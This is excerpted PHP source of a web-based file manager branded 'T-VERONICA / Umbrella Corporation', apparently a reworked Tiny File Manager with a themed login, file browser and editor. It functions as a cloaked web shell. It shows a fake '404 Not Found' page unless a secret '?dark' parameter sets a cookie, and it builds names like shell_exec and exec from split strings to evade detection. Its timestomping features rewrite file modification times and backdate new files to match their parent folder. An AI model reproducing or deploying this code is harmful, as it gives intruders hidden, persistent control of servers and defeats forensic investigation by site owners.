...
if (!function_exists('password_hash')) {
    ...
    function password_verify($password, $hash) {
        ...
        if (strlen($check) !== strlen($hash)) return false;
        $result = 0;
        for ($i = 0; $i < strlen($check); $i++) { $result |= ord($check[$i]) ^ ord($hash[$i]); }
        return $result === 0;
    }
}
...
if (isset($_GET['dark'])) { setcookie('_cfg', '1', time()+86400, '/'); } elseif (!isset($_COOKIE['_cfg'])) { http_response_code(404); echo '<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>404 Not Found</title></head><body><h1>Not Found</h1><p>The requested URL was not found on this server.</p></body></html>'; exit; }
$CONFIG = '{"lang":"en","error_reporting":false,"show_hidden":false,"hide_Cols":false,"theme":"dark"}';

define('VERSION', '2.6');

define('APP_TITLE', 'T Veronica');

$use_auth = true;

$auth_users = array(
    'admin' => '$2b$10$LX1YgF1g.h7kQEOPB6xC3utnsz0ewHrPr2AMQ66P/uL4.wmvIHQd2' 
);
...
if (!defined('FM_SESSION_ID')) {
    define('FM_SESSION_ID', 'fil'.'em'.'an'.'ag'.'er');
}
            ...
            <div class="container h-100">
                <div class="row justify-content-md-center align-content-center h-100vh">
                    <div class="card-wrapper">
                        <div class="card fat" data-bs-theme="dark">
                            <div class="card-body" style="padding:2.5rem 2rem;">
                                <form class="form-signin" action="" method="post" autocomplete="off">
                                    <div style="text-align:center;margin-bottom:24px;">
                                        <div style="font-size:40px;color:rgba(0,140,255,0.7);margin-bottom:8px;">&#9763;</div>
                                        <div style="font-size:20px;color:#00b4ff;letter-spacing:6px;font-family:'Share Tech Mono',monospace;">T-VERONICA</div>
                                        <div style="font-size:10px;color:rgba(0,140,255,0.35);letter-spacing:4px;margin-top:4px;text-transform:uppercase;">Umbrella Corporation</div>
                                    </div>
                                    <div class="mb-3">
                                        <input type="text" class="form-control" id="fm_usr" name="fm_usr" placeholder="Enter Username" required autofocus>
                                    </div>
                                    <div class="mb-3">
                                        <input type="password" class="form-control" id="fm_pwd" name="fm_pwd" placeholder="Enter Access Code" required>
                                    </div>
                                    <div class="mb-3">
                                        <?php fm_show_message(); ?>
                                    </div>
                                    ...
                                    <div class="mb-2">
                                        <button type="submit" class="btn btn-success btn-block w-100" role="button">AUTHENTICATE</button>
                                    </div>
                                    <div style="text-align:center;margin-top:12px;">
                                        <span style="color:rgba(0,140,255,0.25);font-size:11px;letter-spacing:2px;font-family:'Share Tech Mono',monospace;">&gt; AWAITING AUTHORIZATION</span>
                                    </div>
                                </form>
                            </div>
                        </div>
...
if ((isset($_SESSION[FM_SESSION_ID]['logged'], $auth_users[$_SESSION[FM_SESSION_ID]['logged']]) || !FM_USE_AUTH) && isset($_POST['ajax'], $_POST['token'])) {
    ...
    if (isset($_POST['type']) && $_POST['type'] == "touchfile") {
        header('Content-Type: application/json');
        $touchFile = isset($_POST['file']) ? str_replace('/', '', fm_clean_path($_POST['file'])) : '';
        $touchTs = isset($_POST['ts']) ? intval($_POST['ts']) : 0;
        $touchPath = FM_ROOT_PATH;
        if (FM_PATH != '') {
            $touchPath .= '/' . FM_PATH;
        }
        $touchTarget = $touchPath . '/' . $touchFile;
        $tsLimit = time() + 365 * 86400;
        if ($touchFile === '' || $touchFile === '.' || $touchFile === '..' || !fm_isvalid_filename($touchFile)) {
            echo json_encode(array('ok' => false, 'error' => 'Invalid file name'));
            exit();
        }
        if (!file_exists($touchTarget)) {
            echo json_encode(array('ok' => false, 'error' => 'File not found'));
            exit();
        }
        if ($touchTs <= 0 || $touchTs > $tsLimit) {
            echo json_encode(array('ok' => false, 'error' => 'Invalid timestamp'));
            exit();
        }
        if (@touch($touchTarget, $touchTs)) {
            echo json_encode(array('ok' => true, 'modified' => date(FM_DATETIME_FORMAT, $touchTs), 'sort' => 'b-' . strtotime(date("F d Y H:i:s.", $touchTs))));
        } else {
            echo json_encode(array('ok' => false, 'error' => 'Touch failed'));
        }
        exit();
    }
...
if (isset($_POST['newfilename'], $_POST['newfile'], $_POST['token']) && !FM_READONLY) {
    ...
    if (fm_isvalid_filename($new) && $new != '' && $new != '..' && $new != '.' && verifyToken($_POST['token'])) {
        ...
        // Match parent folder mtime so new item looks like it was created together with parent
        if ($createdOk) {
            $parentMtime = @filemtime($path);
            if ($parentMtime) {
                @touch($path . '/' . $new, $parentMtime);
            }
        }
    } else {
    ...
    $FM_PATH = FM_PATH;
    if ($createdOk && $createdIsFile) {
        // Auto-open new file in editor
        fm_redirect(FM_SELF_URL . '?p=' . urlencode($FM_PATH) . '&edit=' . urlencode($new));
    } elseif ($createdOk) {
        // Auto-enter new folder
        $childPath = $FM_PATH === '' ? $new : $FM_PATH . '/' . $new;
        fm_redirect(FM_SELF_URL . '?p=' . urlencode($childPath));
    }
    fm_redirect(FM_SELF_URL . '?p=' . urlencode($FM_PATH));
}
        ...
        if (empty($f['file']['error']) && !empty($tmp_name) && $tmp_name != 'none' && $isFileAllowed) {
            if ($chunkTotal) {
                ...
                if ($out) {
                    ...
                    if ($in) {
                        if (version_compare(PHP_VERSION, '8.0.9', '<')) {
                            do {
                                for (;;) {
                                    $buff = fread($in, 4096);
                                    if ($buff === false || $buff === '') {
...
$folders = array();
$files = array();
$_tmp = array_slice(explode("/", $path), -1); $current_path = $_tmp[0];
            ...
            <div class="card-body">
                <div class="row">
                    <div class="col-xs-12 col-sm-6">
                        <h3 class="app-v-title">T-VERONICA <?php echo VERSION; ?></h3>
                        <p style="color:rgba(0,140,255,0.5);font-size:11px;letter-spacing:3px;text-transform:uppercase;margin-top:8px;">By Umbrella Corporation</p>
                        <p style="color:rgba(0,140,255,0.3);font-size:10px;letter-spacing:2px;margin-top:16px;">&gt; SECURE INTERNAL FILE SYSTEM</p>
                    </div>
                    <div class="col-xs-12 col-sm-6">
                        <div class="card">
...
<form action="" method="post" class="pt-3">
        ...
        <table class="table table-bordered table-hover table-sm" id="main-table" data-bs-theme="<?php echo FM_THEME; ?>">
            ...
            ?>
                <tr>
                    ...
                    <td class="js-editable-date" data-file="<?php echo fm_enc($f) ?>" data-is-folder="1" data-ts="<?php echo $modif_raw; ?>" data-order="a-<?php echo $date_sorting; ?>"><?php echo $modif ?></td>
                    <?php if (!FM_IS_WIN && !$hide_Cols): ?>
                        <td>
                    ...
                    <td class="inline-actions"><?php if (!FM_READONLY): ?>
                            ...
                            <?php if (!FM_IS_WIN): ?>
                                <a title="<?php echo lng('ChangePermissions') ?>" href="?p=<?php echo urlencode(FM_PATH) ?>&amp;chmod=<?php echo urlencode($f) ?>"><i class="fa fa-key" aria-hidden="true"></i></a>
                            <?php endif; ?>
                        <?php endif; ?>
            ...
            ?>
                <tr>
                    ...
                    <td class="js-editable-date" data-file="<?php echo fm_enc($f) ?>" data-is-folder="0" data-ts="<?php echo $modif_raw; ?>" data-order="b-<?php echo $date_sorting; ?>"><?php echo $modif ?></td>
                    <?php if (!FM_IS_WIN && !$hide_Cols): ?>
                    ...
                    <td class="inline-actions">
                        <?php if (!FM_READONLY): ?>
                            ...
                            <?php if (!FM_IS_WIN): ?>
                                <a title="<?php echo lng('ChangePermissions') ?>" href="?p=<?php echo urlencode(FM_PATH) ?>&amp;chmod=<?php echo urlencode($f) ?>"><i class="fa fa-key"></i></a>
                            <?php endif; ?>
                        <?php endif; ?>
    ...
    <div class="row">
        <?php if (!FM_READONLY): ?>
            ...
            <div class="col-3 d-none d-sm-block"><span class="float-right text-muted">T-VERONICA <?php echo VERSION; ?></span></div>
        <?php else: ?>
            <div class="col-12"><span class="float-right text-muted">T-VERONICA <?php echo VERSION; ?></span></div>
        <?php endif; ?>
    </div>
</form>
...
function fm_get_mime_type($file_path)
{
    ...
    } elseif (!stristr(ini_get('dis'.'ab'.'le'.'_f'.'un'.'ct'.'io'.'ns'), 'sh'.'el'.'l_'.'ex'.'ec')) {
        $file = escapeshellarg($file_path);
        $_fn = 'sh'.'el'.'l_'.'ex'.'ec';
        $mime = @$_fn('file -bi ' . $file);
        return $mime;
    } else {
        return '--';
    }
...
function fm_get_size($file)
{
    ...
    if ($iswin === null) {
        ...
        $exec_works = function_exists('ex'.'ec') && !ini_get('safe_mode') && @$_fe('echo EXEC') === 'EXEC';
    }
...
class FM_Config
{
    ...
    function __construct()
    {
        ...
        if (strlen($CONFIG)) {
            ...
            $msg = 'T-VERONICA<br>Error: Cannot load configuration';
            if (substr($fm_url, -1) == '/') {
                $fm_url = rtrim($fm_url, '/');
                $msg .= '<br>';
    ...
    function save()
    {
        ...
        if (is_writable($fm_file)) {
            $lines = file($fm_file);
            $new_config = var_export(json_encode($this->data), true);
            if ($fh = @fopen($fm_file, "w")) {
                for ($x = 0; $x < count($lines); $x++) {
                    if (strpos($lines[$x], '$CONFIG') === 0) {
                        @fputs($fh, '$CONFIG = ' . $new_config . ';' . chr(13) . chr(10));
                    } else {
...
?>
    <nav class="navbar navbar-expand-lg mb-4 main-nav <?php echo $isStickyNavBar ?> bg-body-tertiary" data-bs-theme="<?php echo FM_THEME; ?>">
        <div class="fm-traffic" aria-hidden="true"><span class="tl-r"></span><span class="tl-y"></span><span class="tl-g"></span></div>
        <a class="navbar-brand"><span style="color:#00b4ff">T-VERONICA</span> <span style="font-size:10px;color:rgba(0,140,255,0.3);letter-spacing:2px;">Umbrella Corporation</span></a>
        ...
        <div class="collapse navbar-collapse" id="navbarSupportedContent">
            ...
            <?php
            $path = fm_clean_path($path);
            $root_url = "<a href='?p=' class='fm-home-btn' title='" . FM_ROOT_PATH . "'><i class='fa fa-home' aria-hidden='true'></i><span class='fm-home-label'>Home</span></a>";
                ...
                <ul class="navbar-nav justify-content-end" data-bs-theme="<?php echo FM_THEME; ?>">
                    <li class="nav-item mr-2">
                        <div class="input-group input-group-sm mr-1" style="margin-top:4px;">
                            <input type="text" class="form-control" placeholder="Search (Enter for all)" aria-label="<?php echo lng('Search') ?>" aria-describedby="search-addon2" id="search-addon" title="Type to filter current folder. Press Enter to search recursively in all subfolders.">
                    ...
                    <?php if (!FM_READONLY): ?>
                        <li class="nav-item">
                            <a title="<?php echo lng('Upload') ?>" class="nav-link fm-nav-btn" href="?p=<?php echo urlencode(FM_PATH) ?>&amp;upload"><i class="fa fa-cloud-upload" aria-hidden="true"></i> <span class="d-none d-md-inline"><?php echo lng('Upload') ?></span></a>
                        </li>
                        <li class="nav-item">
                            <a title="<?php echo lng('File') ?>" class="nav-link fm-nav-btn" href="#createNewItem" data-bs-toggle="modal" data-bs-target="#createNewItem" onclick="document.getElementById('customRadioInline1').checked=true;setTimeout(function(){document.getElementById('newfilename').focus();},250);"><i class="fa fa-file-o"></i> <span class="d-none d-md-inline">New File</span></a>
                        </li>
                        <li class="nav-item">
                            <a title="<?php echo lng('Folder') ?>" class="nav-link fm-nav-btn" href="#createNewItem" data-bs-toggle="modal" data-bs-target="#createNewItem" onclick="document.getElementById('customRadioInline2').checked=true;setTimeout(function(){document.getElementById('newfilename').focus();},250);"><i class="fa fa-folder-o"></i> <span class="d-none d-md-inline">New Folder</span></a>
                        </li>
                    <?php endif; ?>
                    <?php if (FM_USE_AUTH): ?>
                        <li class="nav-item avatar dropdown">
                            ...
                            <div class="dropdown-menu dropdown-menu-end text-small shadow" aria-labelledby="navbarDropdownMenuLink-5" data-bs-theme="<?php echo FM_THEME; ?>">
                                ...
                                <a title="<?php echo lng('Logout') ?>" class="dropdown-item nav-link" href="?logout=1" style="color:#ff4444;"><i class="fa fa-sign-out" aria-hidden="true"></i> <?php echo lng('Logout') ?></a>
                            </div>
                        </li>
                    <?php else: ?>
                        <?php if (!FM_READONLY): ?>
...
?>
    ...
    <head>
        ...
        <meta name="description" content="System Dashboard">
        <meta name="author" content="Umbrella Corp">
        ...
        <style>
            ...
            * { box-sizing: border-box; }
            body.fm-login-page {
                ...
                font-size: 14px;
                background: #0a0f1e;
                background-image: radial-gradient(ellipse at 50% 0%, rgba(10,40,80,0.4) 0%, transparent 60%);
                min-height: 100vh;
                margin: 0;
            }
            .fm-login-page .card-wrapper { width: 420px; position: relative; z-index: 1; }
            .fm-login-page .card {
                border: 1px solid rgba(0,140,255,0.15);
                background: rgba(8, 16, 32, 0.9);
                backdrop-filter: blur(16px);
                border-radius: 8px;
                box-shadow: 0 0 40px rgba(0,100,255,0.06), inset 0 1px 0 rgba(0,140,255,0.08);
            }
            .fm-login-page .card-title { display: none; }
            ...
            .fm-login-page .form-control:focus {
                ...
                border-color: #0088ff;
                box-shadow: 0 0 12px rgba(0,136,255,0.2), inset 0 0 6px rgba(0,136,255,0.1);
                color: #00d4ff;
                outline: none;
            }
            .fm-login-page .form-control::placeholder { color: rgba(0,140,255,0.35); text-transform: uppercase; letter-spacing: 2px; }
            .fm-login-page label { color: rgba(0,180,255,0.5); font-size: 11px; font-weight: 400; letter-spacing: 2px; text-transform: uppercase; }
            ...
            .fm-login-page .btn.btn-success:hover {
                background: linear-gradient(180deg, #0077ff 0%, #0055dd 100%);
                box-shadow: 0 0 30px rgba(0,100,255,0.4);
            }
            .fm-login-page .btn.btn-block { padding: 12px 10px }
            .fm-login-page .footer { margin: 16px 0; color: rgba(0,140,255,0.2); text-align: center; font-size: 11px; letter-spacing: 2px; }
            .fm-login-page hr { border-color: rgba(0,140,255,0.1); margin: 1rem 0; }
            @media screen and (max-width:425px) {
                .fm-login-page .card-wrapper { width: 92%; margin: 0 auto; }
            }
            .message { padding: 8px 12px; border: 1px solid rgba(0,140,255,0.15); background: rgba(0,20,50,0.5); border-radius: 4px; color: #00b4ff; font-size: 12px; font-family: 'Share Tech Mono', monospace; letter-spacing: 1px; }
            .message.ok { border-color: rgba(0,255,100,0.3); color: #00ff6a }
            .message.error { border-color: rgba(255,50,50,0.3); color: #ff4444 }
            .message.alert { border-color: rgba(255,180,0,0.3); color: #ffaa00 }
...
?>
    ...
    <head>
        ...
        <title><?php echo fm_enc(APP_TITLE) ?> | <?php echo (isset($_GET['view']) ? $_GET['view'] : ((isset($_GET['edit'])) ? $_GET['edit'] : "Dashboard")); ?></title>
        <?php print_external('pre-jsdelivr'); ?>
        ...
        <style>
            ...
            *::after {
            ...
            .fm-mono { font-family: 'Share Tech Mono', 'JetBrains Mono', 'Courier New', monospace; }
            ...
            .table { --bs-table-bg: transparent; --bs-table-hover-bg: rgba(0,60,120,0.1); --bs-table-striped-bg: rgba(0,40,80,0.05); }
            .table thead th { background: rgba(0,20,50,0.4); color: #5588aa; border-bottom: 1px solid rgba(0,140,255,0.12) !important; text-transform: uppercase; font-size: 10px; letter-spacing: 1.5px; font-weight: 500; font-family: 'Share Tech Mono', monospace; padding: .55rem .6rem; }
            #main-table td { font-size: 12.5px; }
            #main-table td.js-editable-date, #main-table td[data-order^="a-"], #main-table td[data-order^="b-"], #main-table .filename, #main-table tr td:nth-last-child(2), #main-table tr td:nth-last-child(3) { font-family: 'Share Tech Mono', 'JetBrains Mono', monospace; font-size: 11.5px; color: #7a99b8; }
            #main-table .filename { font-size: 12.5px; color: #a0b3c8; }
            #main-table td.inline-actions { width: 1%; white-space: nowrap; }
            ...
            .preview-img {
                max-width: 100%;
                max-height: 80vh;
                background: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAIAAACQkWg2AAAAKklEQVR42mL5
                cursor: zoom-in
            }
            ...
            .inline-actions { white-space: nowrap; display: flex; gap: 3px; align-items: center; }
            .inline-actions > a { display: inline-flex; align-items: center; justify-content: center; transition: transform .15s ease; }
            .inline-actions > a:hover { transform: translateY(-1px); }
            .inline-actions > a > i {
                font-size: 11px;
            ...
            .inline-actions > a > i.fa-trash-o:hover,
            .inline-actions > a[onclick*="Delete"]:hover > i { color: #ff6b6b; border-color: rgba(255,80,80,0.4); box-shadow: 0 0 6px rgba(255,80,80,0.25); }
            .inline-actions > a > i.fa-key { color: #ffc857; }

            /* Click-to-edit date */
            .js-editable-date { cursor: pointer; transition: background .15s ease; }
            .js-editable-date[data-is-folder="0"]:hover { background: rgba(0,100,180,0.18) !important; }
            .js-editable-date.is-editing { padding: 0 !important; }
            .js-editable-date input.fm-date-edit {
                ...
                width: 100%;
                outline: none;
                box-shadow: 0 0 10px rgba(0,180,255,0.3) inset;
            }
            ...
            #fm-sidebar {
                ...
                border-right: 1px solid rgba(0,140,255,0.08);
                padding: 14px 10px 14px;
                overflow-y: auto;
                z-index: 900;
            }
            #fm-sidebar .fm-sb-section {
            ...
            #fm-sidebar .fm-sb-section:first-child { padding-top: 2px; margin-top: 0; }
            #fm-sidebar a.fm-sb-link {
                display: flex;
                align-items: center;
                gap: 9px;
                padding: 5px 10px;
            ...
            #fm-sidebar a.fm-sb-link i { width: 14px; text-align: center; font-size: 12px; color: rgba(0,140,255,0.5); }
            #fm-sidebar a.fm-sb-link:hover {
                background: rgba(0,80,160,0.18);
                color: #00b4ff !important;
            }
            #fm-sidebar a.fm-sb-link:hover i { color: #00b4ff; }
            #fm-sidebar a.fm-sb-link.active {
                background: rgba(0,100,200,0.22);
                color: #00d4ff !important;
            }
            #fm-sidebar a.fm-sb-link.active i { color: #00d4ff; }
            #fm-sidebar .fm-sb-brand {
                position: absolute;
                bottom: 10px;
                left: 10px;
                right: 10px;
            ...
            #fm-sidebar .fm-sb-brand .brand-mark { font-size: 18px; color: rgba(0,140,255,0.5); line-height: 1; }
            #fm-sidebar .fm-sb-brand .brand-name { color: #00b4ff; font-size: 10px; letter-spacing: 3px; margin-top: 4px; font-family: 'Share Tech Mono', monospace; }
            #fm-sidebar .fm-sb-brand .brand-sub { color: rgba(0,140,255,0.3); font-size: 8.5px; letter-spacing: 1.5px; margin-top: 2px; font-family: 'Share Tech Mono', monospace; text-transform: uppercase; }
            body.fm-has-sidebar #wrapper { margin-left: 220px; padding-left: 12px !important; padding-right: 12px !important; }
            body.fm-has-sidebar .main-nav.fixed-top { left: 220px; }
            @media (max-width: 900px) {
                #fm-sidebar { transform: translateX(-100%); transition: transform .25s ease; }
                #fm-sidebar.open { transform: translateX(0); }
                body.fm-has-sidebar #wrapper { margin-left: 0; padding-left: 12px !important; padding-right: 12px !important; }
                body.fm-has-sidebar .main-nav.fixed-top { left: 0; }
            }

            /* macOS-style navbar — single row flex */
            .main-nav {
                position: relative;
                min-height: 44px;
            ...
            .main-nav .fm-traffic span.tl-r { background: #ff5f57; }
            .main-nav .fm-traffic span.tl-y { background: #febc2e; }
            .main-nav .fm-traffic span.tl-g { background: #28c840; }
            .main-nav::before { content: none !important; }
            .main-nav .navbar-brand { flex: 0 0 auto; order: 1; }
            .main-nav .navbar-toggler { order: 2; }
            ...
            .navbar-collapse > div { padding: 0; }
            .navbar-collapse .col-xs-6 { flex: 0 1 auto; padding: 0; max-width: none; }
            .navbar-collapse .col-xs-6:first-of-type { flex: 1 1 auto; min-width: 0; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; font-size: 12px; }
            .navbar-collapse .col-xs-6:last-of-type { flex: 0 0 auto; }
            .navbar-collapse .col-xs-6 a[href^="?p="] { font-family: 'Share Tech Mono', monospace; font-size: 11.5px; color: #6699bb !important; }
            .navbar-collapse .col-xs-6 a[href^="?p="]:hover { color: #00b4ff !important; }
            .navbar-nav { gap: 4px; flex-direction: row !important; align-items: center; }
            .navbar-nav .nav-item .nav-link.fm-nav-btn {
            ...
            .navbar-nav .nav-item .nav-link.fm-nav-btn i { font-size: 12px; }
            .navbar-nav .nav-item .nav-link.fm-nav-btn:hover {
                background: rgba(0,100,200,0.35);
                border-color: rgba(0,180,255,0.35);
                color: #00d4ff !important;
                box-shadow: 0 0 8px rgba(0,180,255,0.2);
            }
            .navbar-nav .nav-item .nav-link { padding: 5px 10px !important; font-size: 11px !important; letter-spacing: 1.5px !important; font-weight: 500 !important; white-space: nowrap; }
            #search-addon { font-size: 11px; padding: 5px 10px; width: 180px; height: 28px; border-radius: 5px 0 0 5px !important; }
            .input-group-sm { width: auto; }
            .input-group-sm .input-group-text { font-size: 11px; padding: 4px 8px; height: 28px; }
            .nav-item.avatar .nav-link { width: 28px; height: 28px; padding: 0 !important; display: inline-flex !important; align-items: center; justify-content: center; background: rgba(0,60,120,0.35); border: 1px solid rgba(0,140,255,0.15); border-radius: 5px; }
            .nav-item.avatar .nav-link:hover { background: rgba(0,120,220,0.5); border-color: rgba(0,180,255,0.35); color: #00d4ff !important; }
            .nav-item.avatar .nav-link i { font-size: 13px !important; }
            .nav-item.avatar .nav-link::after { display: none; }
            .bread-crumb { font-size: 11px; margin: 0 6px; opacity: 0.4; }
            .fa.fa-home { font-size: 12px !important; }
            .fm-home-btn {
            ...
            .fm-home-btn i { font-size: 13px !important; margin: 0 !important; }
            .fm-home-btn .fm-home-label { display: inline-block; }
            @media (max-width: 768px) {
                .fm-home-btn .fm-home-label { display: none; }
                .fm-home-btn { padding: 0; width: 28px; }
            }
            ...
            /* Edit page editor — positioned below toolbar */
            #editor {
                position: absolute;
                right: 15px;
                top: 70px;
            ...
            /* Edit page container — make #editor positioned relative to it */
            .path:has(.edit-file-actions) {
                position: relative;
                height: calc(100vh - 70px);
                margin-bottom: 0 !important;
            }
            /* Edit page toolbar — in flow at top of .path, NOT sticky (avoids editor overlap) */
            .path .row:has(.edit-file-actions) {
            ...
            .edit-file-actions .btn-group { display: inline-flex; gap: 4px; flex-wrap: wrap; }
            .edit-file-actions .btn,
            .js-ace-toolbar .btn,
            .js-ace-toolbar select {
            ...
            .edit-file-actions .btn i,
            .js-ace-toolbar .btn i { margin-right: 4px; }
            .edit-file-actions .btn-outline-primary {
                color: #6aa8d8 !important;
                border-color: rgba(0,140,255,0.25) !important;
                background: rgba(0,40,90,0.3);
            }
            .edit-file-actions .btn-outline-primary:hover {
                color: #00d4ff !important;
                border-color: rgba(0,180,255,0.5) !important;
                background: rgba(0,100,200,0.35) !important;
                box-shadow: 0 0 8px rgba(0,180,255,0.25);
            }
            .edit-file-actions .btn-success {
                background: linear-gradient(180deg, #0088ff, #0055cc) !important;
                color: #fff !important;
                border: 1px solid rgba(0,180,255,0.4) !important;
                box-shadow: 0 0 8px rgba(0,140,255,0.3);
            }
            .edit-file-actions .btn-success:hover {
                background: linear-gradient(180deg, #00a0ff, #0066dd) !important;
            ...
            .js-ace-toolbar .btn-outline-secondary:hover {
                color: #00d4ff !important;
                border-color: rgba(0,180,255,0.4) !important;
                background: rgba(0,100,200,0.3) !important;
            }
            .js-ace-toolbar select.form-select,
            .js-ace-toolbar select {
                background-color: rgba(0,30,70,0.55) !important;
                color: #88aacc !important;
                border: 1px solid rgba(0,140,255,0.25) !important;
                background-image: linear-gradient(45deg, transparent 50%, #6aa8d8 50%),
                                  linear-gradient(135deg, #6aa8d8 50%, transparent 50%) !important;
            ...
            .js-ace-toolbar select:hover {
                border-color: rgba(0,180,255,0.5) !important;
                color: #00d4ff !important;
                background-color: rgba(0,60,130,0.6) !important;
            }
            .js-ace-toolbar select:focus {
                outline: none !important;
                border-color: rgba(0,200,255,0.6) !important;
                box-shadow: 0 0 8px rgba(0,180,255,0.3) !important;
            }
            .js-ace-toolbar select option {
                background-color: #0d1422 !important;
                color: #88aacc !important;
                padding: 6px 10px;
            }
            .js-ace-toolbar select option:checked,
            .js-ace-toolbar select option:hover,
            .js-ace-toolbar select option:focus {
                background: linear-gradient(0deg, rgba(0,100,200,0.6), rgba(0,100,200,0.6)) !important;
                background-color: rgba(0,100,200,0.6) !important;
                color: #00d4ff !important;
            }
            ...
            /* T-VERONICA THEME OVERRIDES */
            .bg-body-tertiary { background-color: #0d1422 !important; }
            .navbar-nav .nav-link { color: #5588aa !important; font-size: 12px; letter-spacing: 1px; text-transform: uppercase; }
            .navbar-nav .nav-link:hover { color: #00b4ff !important; }
            .card { background: rgba(8,16,32,0.9); border: 1px solid rgba(0,140,255,0.1); border-radius: 6px; }
            .card-header { background: rgba(0,20,50,0.4) !important; border-bottom: 1px solid rgba(0,140,255,0.1); color: #5588aa; font-size: 12px; letter-spacing: 1px; text-transform: uppercase; }
            .btn-success { background: linear-gradient(180deg, #0066ff, #0044cc) !important; border: 1px solid rgba(0,100,255,0.3) !important; font-family: 'Share Tech Mono', monospace; letter-spacing: 2px; font-size: 12px; border-radius: 4px; }
            .btn-primary { background: rgba(0,60,120,0.6) !important; border: 1px solid rgba(0,140,255,0.2) !important; font-family: 'Share Tech Mono', monospace; letter-spacing: 1px; font-size: 12px; border-radius: 4px; }
            .btn-info { background: rgba(0,80,140,0.5) !important; border: 1px solid rgba(0,140,255,0.2) !important; color: #00b4ff !important; font-size: 11px; border-radius: 3px; }
            .btn-warning { background: rgba(180,100,0,0.5) !important; border: 1px solid rgba(255,160,0,0.2) !important; font-size: 11px; border-radius: 3px; }
            .btn-danger { background: rgba(150,30,30,0.5) !important; border: 1px solid rgba(255,50,50,0.2) !important; font-size: 11px; border-radius: 3px; }
            .form-control { background: rgba(0,20,50,0.5) !important; border: 1px solid rgba(0,140,255,0.15) !important; color: #88aacc !important; font-family: 'Share Tech Mono', monospace; border-radius: 4px; }
            .form-control:focus { border-color: rgba(0,140,255,0.4) !important; box-shadow: 0 0 8px rgba(0,100,255,0.15) !important; }
            .form-select { background-color: rgba(0,20,50,0.5) !important; border: 1px solid rgba(0,140,255,0.15) !important; color: #88aacc !important; }
            .dropdown-menu { background: #0d1422 !important; border: 1px solid rgba(0,140,255,0.12) !important; }
            .dropdown-item { color: #5588aa !important; font-family: 'Share Tech Mono', monospace; font-size: 12px; }
            .dropdown-item:hover { background: rgba(0,60,120,0.2) !important; color: #00b4ff !important; }
            .modal-content { background: #0d1422 !important; border: 1px solid rgba(0,140,255,0.15) !important; }
            .modal-header { border-bottom: 1px solid rgba(0,140,255,0.1) !important; }
            .modal-footer { border-top: 1px solid rgba(0,140,255,0.1) !important; }
            .path { color: #5588aa; }
            .path a { color: #4488aa !important; }
            .path a:hover { color: #00b4ff !important; }
            input[type="checkbox"] { accent-color: #0066ff; }
            .custom-control-input:checked ~ .custom-control-label::before { background-color: #0066ff; border-color: #0066ff; }
            .form-check-input:checked { background-color: #0066ff; border-color: #0066ff; }
            .text-body-secondary { color: rgba(0,140,255,0.3) !important; }
            .text-muted { color: rgba(0,140,255,0.25) !important; }
            hr { border-color: rgba(0,140,255,0.08) !important; }
            .app-v-title { color: #00b4ff; font-family: 'Share Tech Mono', monospace; }
            hr.custom-hr { border-top: 1px dashed rgba(0,140,255,0.15); border-bottom: none; }
            #search-addon { background: rgba(0,20,50,0.5) !important; border: 1px solid rgba(0,140,255,0.15) !important; color: #5588aa !important; }
            .input-group-text { background: rgba(0,20,50,0.4) !important; border: 1px solid rgba(0,140,255,0.15) !important; color: #5588aa !important; }
            .table-responsive { border-radius: 4px; }
            [data-bs-theme="dark"] { --bs-body-bg: #0a0f1e; --bs-body-color: #8899aa; }

            /* DATATABLES AND TABLE ROW OVERRIDES */
            .table > tbody > tr > td, .table > tbody > tr > th { background-color: transparent !important; }
            .table-striped > tbody > tr:nth-of-type(odd) > * { background-color: rgba(0,40,80,0.25) !important; box-shadow: inset 0 0 0 9999px transparent !important; }
            .table-striped > tbody > tr:nth-of-type(even) > * { background-color: rgba(0,20,50,0.25) !important; box-shadow: inset 0 0 0 9999px transparent !important; }
            table.dataTable tbody tr { background-color: transparent !important; }
            table.dataTable tbody tr.odd > * { background-color: rgba(0,40,80,0.25) !important; box-shadow: inset 0 0 0 9999px transparent !important; }
            table.dataTable tbody tr.even > * { background-color: rgba(0,20,50,0.25) !important; box-shadow: inset 0 0 0 9999px transparent !important; }
            table.dataTable tbody tr:hover > * { background-color: rgba(0,100,180,0.3) !important; }
            .table-hover > tbody > tr:hover > * { background-color: rgba(0,100,180,0.3) !important; }
            table.dataTable.table-striped > tbody > tr.odd > * { background-color: rgba(0,40,80,0.25) !important; }
            table.dataTable.table-striped > tbody > tr.even > * { background-color: rgba(0,20,50,0.25) !important; }
        ...
        if (FM_THEME == "dark"): ?>
            <style>
                ...
                /* inline-actions colors are now defined in the main stylesheet */
    ...
    {
        ?>
        <div style="text-align:center;padding:14px 0 8px;border-top:1px solid rgba(0,140,255,0.05);margin-top:24px;">
            <span style="color:rgba(0,140,255,0.18);font-size:10px;letter-spacing:2.5px;font-family:'Share Tech Mono',monospace;">T-VERONICA &middot; UMBRELLA CORP</span>
        </div>
        </div>
        <?php print_external('js-jquery'); ?>
        <?php print_external('js-bootstrap'); ?>
        ...
        <script>
            ...
            $(document).ready(function() {
                ...
                $('#search-addon').on('keyup', function(e) {
                    // Live filter current view as user types
                    mainTable.search(this.value).draw();
                    // Press Enter to escalate to recursive search across all subfolders
                    if (e.keyCode === 13) {
                        var q = this.value;
                        if (q && q.length > 2) {
                            $('#advanced-search').val(q);
                            $('#searchModal').modal('show');
                            setTimeout(fm_search, 200);
                        } else if (q.length > 0) {
                            toast('Type 3+ characters then press Enter for recursive search');
                        }
                    }
                });
                // Click search icon → also trigger recursive search
                $('#search-addon2').css('cursor', 'pointer').on('click', function() {
                    var q = $('#search-addon').val();
                    if (q && q.length > 2) {
                        $('#advanced-search').val(q);
                        $('#searchModal').modal('show');
                        setTimeout(fm_search, 200);
                ...
                // Click-to-edit date timestamp (files only)
                var FM_READONLY_JS = <?php echo FM_READONLY ? 'true' : 'false'; ?>;
                function fmFormatLocalDT(ts) {
                    var d = new Date(ts * 1000);
                    var pad = function(n){ return (n<10?'0':'')+n; };
                    return d.getFullYear()+'-'+pad(d.getMonth()+1)+'-'+pad(d.getDate())+'T'+pad(d.getHours())+':'+pad(d.getMinutes());
                }
                $(document).on('click', 'td.js-editable-date', function(e) {
                    if (FM_READONLY_JS) return;
                    var $td = $(this);
                    if ($td.data('is-folder') == 1) return;
                    if ($td.hasClass('is-editing')) return;
                    var origText = $td.text();
                    var origOrder = $td.attr('data-order');
                    var ts = parseInt($td.attr('data-ts'), 10) || Math.floor(Date.now()/1000);
